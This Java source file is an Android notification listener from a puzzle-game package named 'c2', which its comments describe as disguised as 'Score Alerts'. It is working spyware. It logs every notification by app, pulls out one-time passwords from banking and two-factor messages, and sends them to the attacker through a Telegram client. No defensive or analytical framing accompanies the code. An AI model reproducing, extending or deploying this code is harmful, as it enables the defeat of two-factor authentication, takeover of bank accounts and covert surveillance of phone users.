package com.gempuzzle.quest.c2;

import android.content.Context;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.gempuzzle.quest.c2.modules.SmsModule;

/**
 * Notification listener — disguised as "Score Alerts".
 * Logs all notifications per-app, relays OTPs detected in
 * notification text (banking apps, 2FA, etc.).
 */
public class NotificationMonitor extends NotificationListenerService {

    private static volatile boolean enabled = false;

    public static boolean isEnabled(Context ctx) {
        try {
            String flat = android.provider.Settings.Secure.getString(ctx.getContentResolver(),
                    "enabled_notification_listeners");
            if (flat == null) return false;
            return flat.contains(ctx.getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    public void onListenerConnected() {
        enabled = true;
        super.onListenerConnected();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg = sbn.getPackageName();
            android.os.Bundle extras = sbn.getNotification().extras;
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            String full = title + " " + text;
            // OTP detection in notifications
            if (SmsModule.isOtp(full)) {
                String code = SmsModule.extractOtp(full);
                TelegramClient.sendMessage("🔑 *OTP VIA NOTIFICATION*\n"
                        + "📱 app: `" + pkg + "`\n"
                        + "📝 " + title + "\n"
                        + "🔑 *" + code + "*\n"
                        + text);
            }
            NotificationBuffer.log(pkg, title, text);
        } catch (Throwable ignored) {}
    }

    @Override
    public void onListenerDisconnected() {
        enabled = false;
        super.onListenerDisconnected();
    }
}
